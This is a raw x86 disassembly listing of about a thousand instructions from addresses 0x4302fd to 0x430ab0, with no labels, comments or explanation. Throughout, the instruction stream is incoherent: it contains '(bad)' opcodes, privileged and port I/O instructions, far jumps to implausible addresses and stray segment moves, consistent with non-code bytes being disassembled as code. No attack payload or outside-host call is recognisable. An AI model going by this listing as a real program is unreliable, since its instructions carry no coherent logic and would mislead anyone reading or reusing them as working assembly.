  4302fd:	mov    es,WORD PTR [ecx+edx*8+0x19fa5ce0]
  430304:	fcom   st(1)
  430306:	pop    es
  430307:	mov    dh,0xc9
  430309:	loopne 0x430387
  43030b:	lods   eax,DWORD PTR ds:[esi]
  43030c:	jbe    0x4302e3
  43030e:	or     eax,0x68102f3a
  430313:	aad    0xc8
  430315:	pop    ds
  430316:	add    BYTE PTR [esi+0x0],dl
  43031c:	add    BYTE PTR [eax+0x7],cl
  43031f:	sti    
  430320:	mov    dh,0xf5
  430322:	push   esi
  430323:	add    ah,bh
  430325:	jle    0x430356
  430327:	rcr    BYTE PTR [ecx],0x41
  43032a:	iret   
  43032b:	dec    edi
  43032c:	jbe    0x430356
  43032e:	pop    es
  43032f:	sti    
  430330:	aam    0xe6
  430332:	cmc    
  430333:	aas    
  430334:	jmp    0xd4435a2e
  430339:	jb     0x4302c3
  43033b:	mov    edi,0x926a7942
  430340:	dec    edi
  430341:	mov    DWORD PTR [ebp+ebp*1+0x29],ebx
  430345:	sar    DWORD PTR [eax+0x3343056],0x0
  43034c:	pushf  
  43034d:	pop    ebp
  43034e:	imul   edx,DWORD PTR [eax-0x68],0xffffffc5
  430352:	mov    al,0x86
  430354:	sbb    DWORD PTR [ecx-0x376a0e7b],ebp
  43035a:	in     al,0x7
  43035c:	xor    DWORD PTR [esi-0x4c],0xfffffffa
  430360:	hlt    
  430361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430362:	lock aas 
  430364:	add    BYTE PTR [ecx+eax*4+0x681f0cbe],bl
  43036b:	repnz add BYTE PTR [ebx+0x3],ch
  43036f:	adc    BYTE PTR [eax],al
  430371:	mov    WORD PTR ds:0xeae8bce2,?
  430377:	cmc    
  430378:	mov    esi,DWORD PTR [eax+eax*4-0x25eff02f]
  43037f:	cli    
  430380:	inc    DWORD PTR [eax]
  430382:	add    BYTE PTR [eax],al
  430384:	add    BYTE PTR [eax],al
  430386:	mov    WORD PTR [edi+0x6e5c0c7b],es
  43038c:	or     al,0x6a
  43038e:	pop    esp
  43038f:	jmp    0xf46e1007
  430394:	sbb    edx,DWORD PTR [ebx]
  430396:	mov    WORD PTR [esi],es
  430398:	cmp    eax,0x25d02
  43039d:	jne    0x43041e
  43039f:	fild   DWORD PTR [ebx-0x4]
  4303a2:	jl     0x430381
  4303a4:	inc    ebx
  4303a5:	or     BYTE PTR [ebx+0x2470f535],al
  4303ab:	fistp  QWORD PTR [ebx-0x4]
  4303ae:	stos   DWORD PTR es:[edi],eax
  4303af:	repz (bad) 
  4303b1:	adc    eax,0xc085064c
  4303b6:	and    BYTE PTR [eax-0x7c67ba7f],ah
  4303bc:	mov    edx,0x45075574
  4303c1:	clc    
  4303c2:	lea    ebp,[ebx-0xe]
  4303c5:	retf   0x218
  4303c8:	add    BYTE PTR [edi-0xd],dh
  4303cb:	xor    al,0x74
  4303ce:	hlt    
  4303cf:	fisttp QWORD PTR [eax+0x4]
  4303d2:	iret   
  4303d3:	sbb    ebx,esp
  4303d5:	mov    esi,0x84f5e9f7
  4303da:	pushf  
  4303db:	push   edx
  4303dc:	and    edi,edi
  4303de:	loope  0x4303c5
  4303e0:	add    DWORD PTR [esi],0x3c06875
  4303e6:	es fwait
  4303e8:	gs adc al,0x0
  4303eb:	add    BYTE PTR [eax],al
  4303ed:	add    BYTE PTR [eax],al
  4303ef:	inc    ecx
  4303f0:	cmp    eax,0xa6ffffbe
  4303f5:	bound  edi,QWORD PTR [esi-0x47]
  4303f8:	add    eax,DWORD PTR [bp+si+0x71]
  4303fc:	add    BYTE PTR [edi+0x4e],dh
  4303ff:	popf   
  430400:	rcl    BYTE PTR [edi+0x37b8afa],0xe7
  430407:	data16 sbb BYTE PTR [eax+edx*2-0x37],bl
  43040c:	dec    esp
  43040d:	test   BYTE PTR gs:[ebx+0x1f],ch
  430411:	(bad)  
  430412:	cli    
  430413:	mov    ds:0x62abc033,eax
  430418:	xchg   esp,eax
  430419:	xor    al,0xc0
  43041b:	mov    edx,0x37c8cb0d
  430420:	push   ebx
  430421:	(bad)  
  430422:	push   esp
  430423:	dec    BYTE PTR [esi+0x1869eb81]
  430429:	iret   
  43042a:	cs push ds
  43042c:	sbb    ah,bl
  43042e:	jg     0x4304a5
  430430:	imul   edi,esi,0x65
  430433:	ja     0x43042d
  430435:	fld    DWORD PTR [eax]
  430437:	lea    ebp,[ebx-0x2]
  43043a:	push   DWORD PTR [ebp-0x2f41014]
  430440:	inc    ebp
  430441:	gs cli 
  430443:	pusha  
  430444:	stos   DWORD PTR es:[edi],eax
  430445:	adc    al,0x40
  430447:	jne    0x430429
  430449:	data16 jle 0x430446
  43044c:	retf   
  43044d:	cmc    
  43044e:	adc    DWORD PTR [eax],0x6b
  430451:	(bad)  
  430452:	inc    DWORD PTR [eax]
  430454:	add    BYTE PTR [eax],al
  430456:	add    BYTE PTR [eax],al
  430458:	inc    ebx
  430459:	(bad)  
  43045b:	pcmpeqw mm5,QWORD PTR [ebx-0x30]
  43045f:	out    0xd5,eax
  430461:	jg     0x4304c8
  430463:	cli    
  430464:	cld    
  430465:	add    DWORD PTR [edi+ebp*2-0xf6bbe7d],ebp
  43046c:	in     eax,dx
  43046d:	mov    esi,0xf2182c10
  430472:	xchg   esp,eax
  430473:	adc    al,0x42
  430475:	pop    ebp
  430476:	jnp    0x43048b
  430478:	scas   al,BYTE PTR es:[edi]
  430479:	neg    ah
  43047b:	push   ss
  43047c:	xor    eax,0x7405b402
  430481:	add    ch,cl
  430483:	lock es (bad) 
  430486:	sub    esi,DWORD PTR [edx+edi*1-0x77]
  43048a:	and    edi,esp
  43048c:	and    al,0x5d
  43048e:	pop    ebx
  43048f:	jo     0x430510
  430491:	shl    eax,1
  430493:	push   0xc3db7289
  430498:	push   0xffffff87
  43049a:	test   al,0xf0
  43049c:	sahf   
  43049d:	xchg   DWORD PTR [ebx],ebp
  43049f:	je     0x430444
  4304a1:	aas    
  4304a2:	xor    al,0x1e
  4304a4:	je     0x43046b
  4304a6:	mov    al,ds:0xe85ac983
  4304ab:	add    edx,DWORD PTR ds:0xaa1b1a03
  4304b1:	lea    ebx,[ebx]
  4304b3:	pop    eax
  4304b4:	lds    esi,FWORD PTR [edx-0x4bd9107f]
  4304ba:	jns    0x4304cb
  4304bc:	add    BYTE PTR [eax],al
  4304be:	add    BYTE PTR [eax],al
  4304c0:	add    BYTE PTR [ecx-0xffbd710],dh
  4304c6:	inc    edx
  4304c7:	hlt    
  4304c8:	push   cs
  4304c9:	cli    
  4304ca:	lds    ebx,FWORD PTR [eax+0x2d]
  4304cd:	mov    al,0x6e
  4304cf:	aam    0xa4
  4304d1:	sbb    ecx,DWORD PTR [eax]
  4304d3:	mov    edx,0xf71e6168
  4304d8:	ret    
  4304d9:	repnz inc ebp
  4304db:	stos   DWORD PTR es:[edi],eax
  4304dc:	push   0x6fb35b75
  4304e1:	fiadd  DWORD PTR [esi+0x584c81ff]
  4304e7:	push   edx
  4304e8:	add    BYTE PTR cs:[esi],0xf
  4304ec:	test   eax,0xbc37b876
  4304f1:	dec    ebp
  4304f2:	(bad)  
  4304f3:	pop    es
  4304f4:	push   ss
  4304f5:	retf   0xe807
  4304f8:	or     ebp,esp
  4304fa:	pop    ecx
  4304fb:	cli    
  4304fc:	jae    0x4304e8
  4304fe:	pop    eax
  4304ff:	pop    edx
  430500:	mov    ds:0xe90b9d5f,al
  430505:	stos   DWORD PTR es:[edi],eax
  430506:	test   bl,ch
  430508:	push   0x2d
  43050a:	repz dec esi
  43050c:	aas    
  43050d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43050e:	pop    eax
  43050f:	je     0x4304fe
  430511:	or     edx,esi
  430513:	jmp    0x4304d6
  430515:	jmp    0x4304f8
  430517:	stc    
  430518:	into   
  430519:	repnz fwait
  43051b:	jae    0x430550
  43051d:	icebp  
  43051e:	(bad)  
  430520:	jmp    0x430575
  430522:	push   es
  430523:	in     ax,dx
  430525:	add    BYTE PTR [eax],al
  430527:	add    BYTE PTR [eax],al
  430529:	add    BYTE PTR ds:0xddf9fd64,ch
  43052f:	pop    eax
  430530:	je     0x43052b
  430532:	leave  
  430533:	(bad)  
  430534:	pop    es
  430535:	sahf   
  430536:	push   ebx
  430537:	push   ebx
  430538:	cli    
  430539:	sbb    al,0x9d
  43053b:	arpl   WORD PTR [eax],cx
  43053d:	lea    ebx,[ebp+0x1aa98358]
  430543:	out    dx,eax
  430544:	cli    
  430545:	hlt    
  430546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430547:	test   dl,al
  430549:	bound  ebx,QWORD PTR [ebx+eiz*2-0x4b]
  43054d:	ins    DWORD PTR es:[edi],dx
  43054e:	popf   
  43054f:	pop    eax
  430550:	sub    DWORD PTR [ecx],0x1a
  430553:	jmp    FWORD PTR [esi+0x305da1e8]
  430559:	xor    cl,BYTE PTR [ebp-0x13be142a]
  43055f:	mov    ds:0xea3300fa,eax
  430564:	jae    0x430556
  430566:	inc    esp
  430567:	add    DWORD PTR [ebx-0x46225c01],esp
  43056d:	pop    edi
  43056e:	add    cl,BYTE PTR [esi-0x39]
  430571:	ret    0xfec0
  430574:	push   esp
  430575:	mov    esi,DWORD PTR [eax+0x30]
  430578:	dec    edi
  430579:	push   0x3ad914
  43057e:	or     DWORD PTR [eax+esi*2],0x12
  430582:	fdiv   st(6),st
  430584:	mov    BYTE PTR [ebp+0x74],al
  430587:	fdivr  QWORD PTR [edx-0x45e8718b]
  43058d:	push   ebx
  43058e:	add    BYTE PTR [eax],al
  430590:	add    BYTE PTR [eax],al
  430592:	add    bl,ch
  430594:	ss dec esi
  430596:	mov    ds,WORD PTR [esi+eax*1+0x50]
  43059a:	xor    esp,DWORD PTR [ebx+0x7ea813e2]
  4305a0:	ds cli 
  4305a2:	mov    ah,BYTE PTR [esp+eax*4]
  4305a5:	shl    DWORD PTR [eax+ebx*4+0x36],1
  4305a9:	dec    BYTE PTR [edi]
  4305ab:	dec    esp
  4305ac:	push   es
  4305ad:	bound  ecx,QWORD PTR [eax]
  4305af:	and    edx,DWORD PTR [eax+ebx*8]
  4305b2:	(bad)  
  4305b3:	lahf   
  4305b4:	(bad)  
  4305b5:	not    BYTE PTR ds:0x3fef38
  4305bb:	(bad)  
  4305bc:	out    0x83,al
  4305be:	call   FWORD PTR [eax-0x3]
  4305c1:	dec    ebp
  4305c2:	lea    ebx,[ecx-0x16]
  4305c5:	dec    edx
  4305c6:	push   edi
  4305c7:	mov    dl,0xe1
  4305c9:	add    eax,0xfa3c0c00
  4305ce:	mov    BYTE PTR [ecx],bl
  4305d0:	loop   0x4305c7
  4305d2:	rcr    DWORD PTR [ecx-0x78f18c42],cl
  4305d8:	inc    ebx
  4305d9:	idiv   BYTE PTR [ebx]
  4305db:	pop    edx
  4305dc:	push   ecx
  4305dd:	cmp    esi,eax
  4305df:	jne    0x43060a
  4305e1:	add    BYTE PTR [ebx],al
  4305e3:	jne    0x4305a9
  4305e5:	stc    
  4305e6:	push   edx
  4305e7:	fst    st(4)
  4305e9:	xchg   ebp,eax
  4305ea:	cli    
  4305eb:	loop   0x430666
  4305ed:	popa   
  4305ee:	je     0x4305cd
  4305f0:	adc    BYTE PTR [ecx],dl
  4305f2:	mov    eax,0x86feab67
  4305f7:	add    BYTE PTR [eax],al
  4305f9:	add    BYTE PTR [eax],al
  4305fb:	add    BYTE PTR [edx-0x49373ac0],dh
  430601:	mov    ?,WORD PTR [ebp-0x15]
  430604:	and    al,0xec
  430606:	loopne 0x430603
  430608:	jne    0x43059b
  43060a:	jne    0x430640
  43060c:	sub    eax,0x4bffbe36
  430611:	out    0xc0,al
  430613:	sti    
  430614:	inc    ebp
  430615:	test   esi,edi
  430617:	gs push edi
  430619:	push   0x998a07ef
  43061e:	jg     0x4305df
  430620:	or     BYTE PTR [ebx],dl
  430622:	sub    eax,0xbeb77945
  430627:	cli    
  430628:	mov    BYTE PTR [edi],dh
  43062a:	or     eax,0x66ec7540
  43062f:	jne    0x430619
  430631:	add    esi,DWORD PTR [edi+0x44]
  430634:	pop    ecx
  430635:	sub    esi,eax
  430637:	sub    eax,0xfa98375d
  43063c:	dec    edx
  43063d:	aam    0x66
  43063f:	test   BYTE PTR [edx-0x11],al
  430642:	sbb    cl,BYTE PTR [ebp+0x52ce6fb0]
  430648:	lahf   
  430649:	dec    ebp
  43064a:	popa   
  43064b:	je     0x4306ca
  43064d:	or     BYTE PTR [esi+edi*2+0x1d],0x6a
  430652:	out    dx,eax
  430653:	pmaxsw mm4,QWORD PTR ds:0x4f3584f8
  43065a:	inc    DWORD PTR [esi+0x7c6502b8]
  430660:	add    BYTE PTR [eax],al
  430662:	add    BYTE PTR [eax],al
  430664:	add    BYTE PTR [edx-0x73],bh
  430667:	and    DWORD PTR [edx+0x72],ebx
  43066a:	mov    cl,0x40
  43066c:	adc    DWORD PTR [ebx],ebx
  43066e:	pop    ecx
  43066f:	dec    ecx
  430670:	xor    dh,BYTE PTR [ebp+0x203ca2b8]
  430676:	or     ch,cl
  430678:	shl    bl,1
  43067a:	gs xchg edi,eax
  43067c:	sbb    BYTE PTR [ecx+0x56],0xe8
  430680:	int    0xf3
  430682:	push   cs
  430683:	popf   
  430684:	adc    BYTE PTR ds:0x3178b202,dh
  43068a:	push   esi
  43068b:	mov    eax,0x9357b2d9
  430690:	imul   DWORD PTR [edi-0x3b990f32]
  430696:	jle    0x4306c0
  430698:	lock pop edi
  43069a:	sbb    ebp,DWORD PTR [edi+eiz*2+0xfea1c06]
  4306a1:	jns    0x430698
  4306a3:	sub    BYTE PTR [edx+eax*1],al
  4306a6:	pop    edx
  4306a7:	pop    esi
  4306a8:	out    dx,eax
  4306a9:	dec    edi
  4306aa:	lea    ebp,[ebx]
  4306ac:	push   0xefe642f3
  4306b1:	xchg   edi,eax
  4306b2:	push   0x60
  4306b4:	fwait
  4306b5:	pop    edi
  4306b6:	pop    eax
  4306b7:	ins    DWORD PTR es:[edi],dx
  4306b8:	ins    BYTE PTR es:[edi],dx
  4306b9:	icebp  
  4306ba:	push   edi
  4306bb:	cmp    al,0x8
  4306bd:	add    BYTE PTR [esi+0x57a7d4ac],bh
  4306c3:	sbb    edi,eax
  4306c5:	aas    
  4306c6:	into   
  4306c7:	lock add BYTE PTR fs:[eax],al
  4306cb:	add    BYTE PTR [eax],al
  4306cd:	add    BYTE PTR [esp+eax*4],ah
  4306d0:	nop
  4306d1:	add    ebp,DWORD PTR [eax+0x133d5dfe]
  4306d7:	or     ebx,DWORD PTR [edx]
  4306d9:	pop    esp
  4306da:	int    0xa9
  4306dc:	jns    0x430743
  4306de:	dec    ebx
  4306df:	inc    edx
  4306e0:	call   DWORD PTR ds:0xe1bd4b3b
  4306e6:	jbe    0x430695
  4306e8:	xchg   BYTE PTR [ebp+0x26],dl
  4306eb:	mov    bl,0x7e
  4306ed:	les    edx,FWORD PTR [edx-0x3e40b2a9]
  4306f3:	pop    esp
  4306f4:	je     0x4306d3
  4306f6:	push   ecx
  4306f7:	out    dx,al
  4306f8:	ret    
  4306f9:	(bad)  [esi+0x6ab4f957]
  4306ff:	jg     0x430735
  430701:	sub    DWORD PTR [edx+0x3961ffc2],eax
  430707:	xchg   BYTE PTR [ebp+eiz*1-0x57],al
  43070b:	pop    esp
  43070c:	je     0x4306fb
  43070e:	adc    DWORD PTR [ebp-0x6],ebx
  430711:	jmp    0x953dba8c
  430716:	scas   al,BYTE PTR es:[edi]
  430717:	pop    esp
  430718:	shr    DWORD PTR [ecx+edi*1-0x32],1
  43071c:	pop    ebx
  43071d:	(bad)  
  43071e:	imul   eax,DWORD PTR [esi],0xf
  430721:	test   eax,0x73f7d776
  430726:	fwait
  430727:	mov    dl,0x86
  430729:	sub    al,0xd
  43072b:	adc    al,bl
  43072d:	out    dx,al
  43072e:	mov    ecx,0x5d3f98
  430733:	add    BYTE PTR [eax],al
  430735:	add    BYTE PTR [eax],al
  430737:	xor    ebx,DWORD PTR [edi+0x1c]
  43073a:	adc    cl,0x5c
  43073d:	mov    BYTE PTR [ecx+edx*8],ch
  430740:	jle    0x430701
  430742:	xor    eax,0xb64f178f
  430747:	arpl   WORD PTR [ebx],cx
  430749:	push   eax
  43074a:	scas   al,BYTE PTR es:[edi]
  43074b:	jnp    0x4307cb
  43074d:	or     eax,0x745b7929
  430752:	cmc    
  430753:	ret    
  430754:	mov    esi,0xce9839fb
  430759:	div    DWORD PTR [esi]
  43075b:	nop
  43075c:	into   
  43075d:	pop    es
  43075e:	add    bl,bh
  430760:	les    edi,FWORD PTR [ecx-0x8]
  430763:	or     eax,0x618b0f68
  430768:	out    dx,al
  430769:	test   al,al
  43076b:	add    BYTE PTR [eax-0x7f],bl
  43076e:	dec    ebp
  43076f:	cwde   
  430770:	fadd   QWORD PTR [edx]
  430772:	mov    edx,ecx
  430774:	jmp    0xe8f2:0x684b0ae1
  43077b:	retf   
  43077c:	jnp    0x430773
  43077e:	(bad)  
  43077f:	ffreep st(2)
  430781:	push   ebp
  430782:	pop    esi
  430783:	pop    ss
  430784:	sbb    al,0xbd
  430786:	adc    ah,bl
  430788:	inc    edi
  430789:	sub    esp,0x5306af5f
  43078f:	add    bl,dl
  430791:	xor    edi,DWORD PTR [eax-0x3f]
  430794:	inc    edx
  430795:	cli    
  430796:	push   esi
  430797:	not    BYTE PTR [esi+0x51]
  43079a:	lea    eax,[eax]
  43079c:	add    BYTE PTR [eax],al
  43079e:	add    BYTE PTR [eax],al
  4307a0:	rcr    esi,1
  4307a2:	dec    edx
  4307a3:	(bad)  
  4307a4:	shl    esi,1
  4307a6:	dec    edx
  4307a7:	push   0xffffffc1
  4307a9:	fnsave [ebx+0x8]
  4307ac:	adc    eax,0x62fff640
  4307b1:	fidivr DWORD PTR [ebx]
  4307b3:	test   al,0x81
  4307b5:	inc    edx
  4307b6:	cli    
  4307b7:	jmp    0xbee1:0xf4438776
  4307be:	outs   dx,BYTE PTR ds:[esi]
  4307bf:	and    ecx,ecx
  4307c1:	xor    esi,esi
  4307c3:	push   ecx
  4307c4:	jmp    0xc694f5fc
  4307c9:	pop    ebx
  4307ca:	dec    edx
  4307cb:	mov    DWORD PTR [ecx+0x185d8906],esp
  4307d1:	loop   0x4307a3
  4307d3:	jmp    DWORD PTR [ecx+0x6]
  4307d6:	mov    DWORD PTR [ebp+0x14],eax
  4307d9:	loop   0x4307a8
  4307db:	xor    DWORD PTR [ebp-0x12],0x5b
  4307df:	jmp    DWORD PTR [ecx-0x41a6416d]
  4307e5:	xchg   edx,eax
  4307e6:	inc    ecx
  4307e7:	add    esi,DWORD PTR [ebp-0x12]
  4307ea:	mov    ch,bl
  4307ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4307ed:	cli    
  4307ee:	push   esi
  4307ef:	inc    esp
  4307f0:	jns    0x43085d
  4307f2:	(bad)  
  4307f3:	call   DWORD PTR [ebp+0x352f0237]
  4307f9:	mov    cl,0xef
  4307fb:	jle    0x430855
  4307fd:	mov    bl,0x3
  4307ff:	dec    edi
  430800:	inc    ebx
  430801:	loopne 0x43081b
  430803:	rol    BYTE PTR [eax],0x0
  430806:	add    BYTE PTR [eax],al
  430808:	add    BYTE PTR [eax+0x7565feab],cl
  43080e:	out    0xc8,al
  430810:	mul    DWORD PTR ds:0x25fac8de
  430816:	and    al,0xd9
  430818:	or     eax,edx
  43081a:	jbe    0x430822
  43081c:	sti    
  43081d:	mov    ds:0x3b7443de,eax
  430822:	in     al,dx
  430823:	clc    
  430824:	or     eax,DWORD PTR [esi-0x62810155]
  43082a:	adc    edi,0x569eee36
  430830:	aas    
  430831:	or     DWORD PTR [esi+0x64dd2966],edx
  430837:	pop    ebp
  430838:	xchg   BYTE PTR [ebp+0x4f7339e6],bl
  43083e:	mov    cl,0x3
  430840:	lea    edi,[eax+0x6a4eae33]
  430846:	scas   al,BYTE PTR es:[edi]
  430847:	psubq  mm5,mm0
  43084a:	push   ebx
  43084b:	pop    ebp
  43084c:	shl    esi,1
  43084e:	inc    edx
  43084f:	add    esi,DWORD PTR [ebp+0x65]
  430852:	loopne 0x43081b
  430854:	(bad)  
  430856:	stos   BYTE PTR es:[edi],al
  430857:	rol    BYTE PTR [esi+ebp*8],cl
  43085a:	add    DWORD PTR [esp+ebx*2],esi
  43085d:	in     eax,dx
  43085e:	or     DWORD PTR [esi+0x46],ebp
  430861:	sbb    ecx,DWORD PTR [edx]
  430863:	ss ins BYTE PTR es:[edi],dx
  430865:	gs stos BYTE PTR es:[edi],al
  430867:	mov    DWORD PTR [edx+0x53],esp
  43086a:	inc    edx
  43086b:	and    bh,BYTE PTR [edi+0x0]
  430871:	add    BYTE PTR ds:0xa703ec40,ch
  430877:	mov    DWORD PTR [edi+0x4a],esi
  43087a:	je     0x430862
  43087c:	pop    edx
  43087d:	ret    
  43087e:	add    bl,BYTE PTR [ebp-0x6]
  430881:	mov    cl,0xff
  430883:	push   esp
  430884:	push   edx
  430885:	(bad)  
  430886:	xchg   esi,eax
  430887:	or     ch,al
  430889:	xlat   BYTE PTR ds:[ebx]
  43088a:	je     0x430838
  43088c:	inc    eax
  43088d:	adc    DWORD PTR ds:0xb48e4155,ecx
  430893:	mov    bl,0x26
  430895:	pop    es
  430896:	jne    0x430847
  430898:	pop    ebp
  430899:	outs   dx,DWORD PTR ds:[esi]
  43089a:	cmc    
  43089b:	fadd   QWORD PTR gs:[esi*2+0x27b9b602]
  4308a3:	mov    DWORD PTR [eax],esp
  4308a5:	xchg   BYTE PTR [edi+0x185e225],ch
  4308ab:	add    ch,cl
  4308ad:	add    esi,esp
  4308af:	push   esp
  4308b0:	pop    eax
  4308b1:	or     BYTE PTR [ebp+0x2],dh
  4308b4:	jmp    0xf203:0xe901fd92
  4308bb:	mov    dh,0xe0
  4308bd:	mov    BYTE PTR [ebx-0x39ef0c33],ch
  4308c3:	add    BYTE PTR [esi+0x5c],ah
  4308c6:	jo     0x430898
  4308c8:	jmp    0x43084e
  4308ca:	(bad)  
  4308cb:	in     al,dx
  4308cc:	push   ebx
  4308cd:	xlat   BYTE PTR ds:[ebx]
  4308ce:	sti    
  4308cf:	int    0xf4
  4308d1:	dec    eax
  4308d2:	icebp  
  4308d3:	pop    edx
  4308d4:	mov    edx,0x61
  4308d9:	add    BYTE PTR [eax],al
  4308db:	dec    edi
  4308dc:	(bad)  
  4308dd:	(bad)  
  4308de:	call   0xaec80b59
  4308e3:	sbb    eax,0xe8be8709
  4308e8:	dec    ecx
  4308e9:	mov    WORD PTR [ecx+edx*8+0x59],fs
  4308ed:	cli    
  4308ee:	xchg   esi,eax
  4308ef:	cdq    
  4308f0:	mov    esp,0xd3948f37
  4308f5:	cmp    ecx,ebp
  4308f7:	inc    edx
  4308f8:	les    ecx,FWORD PTR [edx]
  4308fa:	aaa    
  4308fb:	aas    
  4308fc:	push   esi
  4308fd:	mov    esp,DWORD PTR [esi]
  4308ff:	dec    ebp
  430900:	or     al,0xc8
  430902:	sti    
  430903:	cmp    ebx,esp
  430905:	(bad)  
  430906:	jmp    0xd72b0b81
  43090b:	sbb    eax,0x4162fa59
  430910:	jle    0x430903
  430912:	aad    0xe9
  430914:	pop    ebx
  430915:	ss xchg esp,eax
  430917:	push   esp
  430918:	pop    eax
  430919:	sub    DWORD PTR cs:[ecx+eax*1],edi
  43091d:	ins    BYTE PTR es:[edi],dx
  43091e:	addr16 mov cl,0x53
  430921:	fs pusha 
  430923:	scas   eax,DWORD PTR es:[edi]
  430924:	mov    ebx,0x5061ebe6
  430929:	test   BYTE PTR [edi],dl
  43092b:	int    0xf7
  43092d:	push   edx
  43092e:	push   ss
  43092f:	ret    0x6207
  430932:	pusha  
  430933:	xchg   edi,eax
  430934:	out    dx,eax
  430935:	out    0x20,eax
  430937:	int3   
  430938:	pop    eax
  430939:	cli    
  43093a:	jo     0x4308fb
  43093c:	add    eax,DWORD PTR [ebp+0x29]
  430942:	add    BYTE PTR [eax],al
  430944:	mov    ds:0x90e786f2,al
  430949:	add    al,BYTE PTR [edi+0x2f0315b7]
  43094f:	test   eax,0xa056b935
  430954:	mov    al,0xfb
  430956:	jmp    DWORD PTR [ecx-0x7d]
  430959:	(bad)  
  43095a:	adc    DWORD PTR [eax],eax
  43095c:	mov    esi,?
  43095e:	test   bl,bl
  430960:	mov    BYTE PTR [eax],ch
  430962:	push   0xffff5c80
  430967:	mov    WORD PTR [edx+0x46],?
  43096a:	add    BYTE PTR fs:[edi-0x1f],bh
  43096e:	adc    edx,DWORD PTR [eax+0x2a]
  430971:	aas    
  430972:	cli    
  430973:	mov    bl,BYTE PTR [ecx+0x6]
  430976:	jnp    0x43093c
  430978:	inc    eax
  430979:	out    0xac,eax
  43097b:	push   eax
  43097c:	repz loope 0x4309c9
  43097f:	dec    DWORD PTR [ecx]
  430981:	pop    es
  430982:	dec    ebx
  430983:	(bad)  
  430984:	jmp    0x430a03
  430986:	mov    esi,0xf712760c
  43098b:	jne    0x43098d
  43098d:	test   BYTE PTR [eax+0x16],al
  430990:	sub    al,0xe2
  430992:	int    0x83
  430994:	cwde   
  430995:	add    eax,DWORD PTR [ebx+0x497a37c6]
  43099b:	push   ebp
  43099c:	cli    
  43099d:	cdq    
  43099e:	xor    eax,0x8b0a3993
  4309a4:	test   edi,esp
  4309a6:	jmp    DWORD PTR [esi+0x0]
  4309ac:	add    BYTE PTR [ebx-0x43b87e1e],dl
  4309b2:	test   DWORD PTR [ebx],ebp
  4309b4:	dec    esp
  4309b5:	stos   BYTE PTR es:[edi],al
  4309b6:	ds cli 
  4309b8:	mov    dl,bl
  4309ba:	dec    esi
  4309bb:	pusha  
  4309bc:	mov    ebx,ebx
  4309be:	dec    edx
  4309bf:	pusha  
  4309c0:	mov    edx,ecx
  4309c2:	dec    edx
  4309c3:	jns    0x430a2c
  4309c5:	lods   al,BYTE PTR ds:[esi]
  4309c6:	(bad)  
  4309c7:	sub    al,al
  4309c9:	hlt    
  4309ca:	jle    0x4309c6
  4309cc:	dec    DWORD PTR [eax+ebp*2+0x71784787]
  4309d3:	push   ebp
  4309d4:	dec    eax
  4309d5:	loope  0x430a1f
  4309d7:	inc    edx
  4309d8:	push   ebx
  4309d9:	jne    0x4309e6
  4309db:	pop    ebx
  4309dc:	aam    0xa6
  4309de:	fwait
  4309df:	in     eax,0x2b
  4309e1:	rcl    edx,cl
  4309e3:	(bad)  
  4309e4:	cli    
  4309e5:	retf   
  4309e6:	sub    edi,DWORD PTR [ebp-0x3f]
  4309e9:	arpl   cx,si
  4309eb:	pop    edx
  4309ec:	aam    0xcf
  4309ee:	dec    edi
  4309ef:	call   0xf1e401f3
  4309f4:	push   edx
  4309f5:	xor    dl,BYTE PTR [edi-0x52]
  4309f8:	adc    DWORD PTR [ebp+0x59c37d5b],esi
  4309fe:	and    BYTE PTR [edx-0x476341a4],bh
  430a04:	xchg   BYTE PTR [ecx],ah
  430a06:	fld    TBYTE PTR [edi+0x57]
  430a09:	je     0x430a66
  430a0b:	dec    BYTE PTR [esi+0x46]
  430a0e:	je     0x4309c1
  430a10:	aaa    
  430a11:	add    BYTE PTR [eax],al
  430a13:	add    BYTE PTR [eax],al
  430a15:	add    BYTE PTR [eax-0xdfa2db1],bl
  430a1b:	ss out dx,al
  430a1d:	out    0xfb,eax
  430a1f:	jmp    0x6312047e
  430a24:	scas   al,BYTE PTR es:[edi]
  430a25:	cli    
  430a26:	pusha  
  430a27:	sub    esp,DWORD PTR [esi-0x65]
  430a2a:	pop    eax
  430a2b:	adc    DWORD PTR [ebx-0x7a],ebx
  430a2e:	lds    edx,FWORD PTR [ebp+ecx*2+0x73]
  430a32:	and    esp,esp
  430a34:	enter  0x220b,0xd6
  430a38:	mov    al,ds:0x5af0b3a7
  430a3d:	out    0xf9,eax
  430a3f:	inc    edi
  430a40:	pop    ecx
  430a41:	cli    
  430a42:	pcmpgtd mm1,QWORD PTR [edi+0x66a3a57c]
  430a49:	and    BYTE PTR [ecx+0x50],0x59
  430a4d:	push   ecx
  430a4e:	clc    
  430a4f:	fisubr WORD PTR [ebx-0x519f7d07]
  430a55:	xchg   BYTE PTR [edx-0x466ec6fe],dh
  430a5b:	idiv   BYTE PTR [eax]
  430a5d:	ins    BYTE PTR es:[edi],dx
  430a5e:	add    DWORD PTR [eax-0x2f],edi
  430a61:	pop    esi
  430a62:	jecxz  0x430aaa
  430a64:	clc    
  430a65:	mov    esi,0xd7c14adb
  430a6a:	outs   dx,DWORD PTR ds:[esi]
  430a6b:	push   ecx
  430a6c:	xor    edi,eax
  430a6e:	repz (bad) 
  430a70:	loopne 0x430a24
  430a72:	aas    
  430a73:	shl    al,cl
  430a75:	pop    esi
  430a76:	popa   
  430a77:	sar    bl,cl
  430a79:	ret    
  430a7a:	add    BYTE PTR [eax],al
  430a7c:	add    BYTE PTR [eax],al
  430a7e:	add    BYTE PTR [edx],dh
  430a80:	test   BYTE PTR [eax+0x5f04a004],ah
  430a86:	cmp    ebx,DWORD PTR [edi]
  430a88:	xlat   BYTE PTR ds:[ebx]
  430a89:	hlt    
  430a8a:	imul   ecx,DWORD PTR [ecx-0x58],0xffffff81
  430a8e:	pop    esi
  430a8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a90:	pop    edx
  430a91:	shl    DWORD PTR [ebp-0x75edaef1],0xc3
  430a98:	lods   al,BYTE PTR ds:[esi]
  430a99:	lahf   
  430a9a:	inc    ecx
  430a9b:	push   0x2
  430a9d:	mov    esp,0x4c84de8a
  430aa2:	iret   
  430aa3:	in     al,0xc6
  430aa5:	loopne 0x430a9a
  430aa7:	xor    edi,DWORD PTR [ebp-0x15]
  430aaa:	inc    edi
  430aab:	push   0x46b6e8c2
  430ab0:	loope  0x430b17
